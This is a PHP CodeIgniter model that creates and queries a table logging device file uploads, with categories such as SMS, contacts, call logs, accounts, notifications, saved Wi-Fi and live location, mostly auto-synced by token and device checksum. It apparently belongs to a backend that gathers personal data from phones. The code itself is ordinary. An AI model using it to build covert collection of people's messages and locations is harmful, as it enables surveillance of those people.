<?php

namespace App\Models;

use CodeIgniter\Model;

class Mod_Uploaded_Files extends Model
{
    protected $table = 'tbl_uploaded_files';
    protected $primaryKey = 'file_id';
    protected $useAutoIncrement = true;

    protected $returnType = 'array';
    protected $useSoftDeletes = false;

    protected $allowedFields = [
        'original_filename',
        'stored_filename',
        'file_size_bytes',
        'file_extension',
        'mime_type',
        'file_category',
        'token_used',
        'token_owner_id',
        'device_checksum',
        'device_print_id',
        'upload_path',
        'upload_status',
        'upload_error',
        'upload_source',
        'parsed_at',
        'parsed_records',
        'parse_duration_ms',
        'processed_at'
    ];

    protected $useTimestamps = true;
    protected $createdField = 'uploaded_at';
    protected $updatedField = 'updated_at';
    protected $dateFormat = 'datetime';

    // Validation rules
    protected $validationRules = [
        'original_filename' => 'required|max_length[255]',
        'stored_filename' => 'required|max_length[255]',
        'file_size_bytes' => 'required|is_natural',
        'token_used' => 'required|max_length[255]',
        'device_checksum' => 'required|max_length[100]',
        'file_category' => 'required|in_list[apps,sms,contacts,logs,files,location,calls,call_logs,device,device_context,context,network,network_info,accounts,calendar,app,app_usage,usage,notifications,bluetooth,sensors,sensor,cell_towers,display_info,storage,thermal,nfc,data_usage,saved_wifi,default_apps,alarms,hardware_graphics,hardware_network,app_security,network_security,telephony_network,system_locale,camera_info,battery_stats,accessibility,input_methods,proc_info,processes,misc_software,misc_hardware,apps_notifications,audio,image,deviceinfo,device_info,security_audit,securityaudit,sim_configs,sim_config,live_locations,live_location]'
 
    ];

    protected $validationMessages = [];
    protected $skipValidation = false;

    /**
     * Initialize - ensure table exists
     */
    public function __construct()
    {
        parent::__construct();
        $this->ensureTableExists();
    }

    /**
     * Ensure the tbl_uploaded_files table exists
     */
    private function ensureTableExists(): void
    {
        if (!$this->db->tableExists($this->table)) {
            $this->createTable();
        }
    }

    /**
     * Create tbl_uploaded_files table
     */
    private function createTable(): bool
    {
        $sql = "
            CREATE TABLE IF NOT EXISTS `{$this->table}` (
                `file_id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
                `original_filename` VARCHAR(255) NOT NULL,
                `stored_filename` VARCHAR(255) NOT NULL,
                `file_size_bytes` BIGINT UNSIGNED NOT NULL,
                `file_extension` VARCHAR(10) NOT NULL,
                `mime_type` VARCHAR(100) NOT NULL,
                `file_category` VARCHAR(50) NOT NULL,
                `token_used` VARCHAR(255) NOT NULL,
                `token_owner_id` INT UNSIGNED NULL,
                `device_checksum` VARCHAR(100) NOT NULL,
                `device_print_id` VARCHAR(100) NOT NULL,
                `upload_path` VARCHAR(500) NOT NULL,
                `upload_status` ENUM('uploaded', 'processing', 'processed', 'failed') DEFAULT 'uploaded',
                `upload_error` TEXT NULL,
                `upload_source` ENUM('manual', 'auto_sync', 'web_initiated') DEFAULT 'auto_sync',
                `parsed_at` TIMESTAMP NULL,
                `parsed_records` INT UNSIGNED DEFAULT 0,
                `parse_duration_ms` INT UNSIGNED NULL,
                `uploaded_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                `processed_at` TIMESTAMP NULL,
                `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                PRIMARY KEY (`file_id`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
        ";

        try {
            $this->db->query($sql);
            log_message('info', 'tbl_uploaded_files table created successfully');
            return true;
        } catch (\Exception $e) {
            log_message('error', 'Failed to create tbl_uploaded_files table: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Log file upload
     */
    public function logUpload(array $data): ?int
    {
        try {
            $insertData = [
                'original_filename' => $data['original_name'] ?? '',
                'stored_filename' => $data['new_name'] ?? '',
                'file_size_bytes' => $data['size'] ?? 0,
                'file_extension' => $data['extension'] ?? '',
                'mime_type' => $data['mime_type'] ?? '',
                'file_category' => $data['category'] ?? 'unknown',
                'token_used' => $data['token'] ?? '',
                'token_owner_id' => $data['owner_id'] ?? null,
                'device_checksum' => $data['device_checksum'] ?? '',
                'device_print_id' => $data['device_print_id'] ?? '',
                'upload_path' => $data['upload_path'] ?? '',
                'upload_source' => $data['upload_source'] ?? 'auto_sync',
                'upload_status' => 'uploaded'
            ];

            $fileId = $this->insert($insertData);

            if ($fileId) {
                log_message('info', "File logged in database. ID: {$fileId}");
                return $fileId;
            }

            log_message('error', 'Failed to insert file record');
            return null;

        } catch (\Exception $e) {
            log_message('error', 'Failed to log upload: ' . $e->getMessage());
            return null;
        }
    }

    /**
     * Update file processing status
     */
    public function updateStatus(int $fileId, string $status, ?array $additionalInfo = null): bool
    {
        if ($fileId <= 0) {
            return false;
        }

        $data = ['upload_status' => $status];

        if ($status === 'processed' && is_array($additionalInfo)) {
            $data['parsed_at'] = date('Y-m-d H:i:s');

            // Handle boolean record_count
            $recordCount = $additionalInfo['record_count'] ?? 0;
            if (is_bool($recordCount)) {
                $recordCount = $recordCount ? 1 : 0;
            }

            $data['parsed_records'] = (int)$recordCount;
            $data['parse_duration_ms'] = $additionalInfo['duration_ms'] ?? null;
            $data['processed_at'] = date('Y-m-d H:i:s');
        } elseif ($status === 'failed' && isset($additionalInfo['error'])) {
            $data['upload_error'] = substr($additionalInfo['error'], 0, 500);
        }

        return $this->update($fileId, $data);
    }

    /**
     * Get files by token
     */
    public function getFilesByToken(string $token, int $limit = 100): array
    {
        return $this->where('token_used', $token)
            ->orderBy('uploaded_at', 'DESC')
            ->limit($limit)
            ->findAll();
    }

    /**
     * Get files by device
     */
    public function getFilesByDevice(string $deviceChecksum, int $limit = 100): array
    {
        return $this->where('device_checksum', $deviceChecksum)
            ->orderBy('uploaded_at', 'DESC')
            ->limit($limit)
            ->findAll();
    }

    /**
     * Get pending files for processing
     */
    public function getPendingFiles(int $limit = 10): array
    {
        return $this->where('upload_status', 'uploaded')
            ->orderBy('uploaded_at', 'ASC')
            ->limit($limit)
            ->findAll();
    }

    /**
     * Get upload statistics
     */
    public function getUploadStats(string $timeframe = 'day'): array
    {
        $groupBy = '';
        switch ($timeframe) {
            case 'hour':
                $groupBy = 'DATE_FORMAT(uploaded_at, "%Y-%m-%d %H:00")';
                break;
            case 'day':
                $groupBy = 'DATE(uploaded_at)';
                break;
            case 'month':
                $groupBy = 'DATE_FORMAT(uploaded_at, "%Y-%m")';
                break;
            default:
                $groupBy = 'DATE(uploaded_at)';
        }

        $query = $this->db->query("
            SELECT 
                {$groupBy} as period,
                COUNT(*) as total_uploads,
                SUM(file_size_bytes) as total_size,
                AVG(file_size_bytes) as avg_size,
                COUNT(DISTINCT device_checksum) as unique_devices,
                COUNT(DISTINCT token_used) as unique_tokens
            FROM {$this->table}
            WHERE uploaded_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)
            GROUP BY {$groupBy}
            ORDER BY period DESC
        ");

        return $query->getResultArray();
    }
}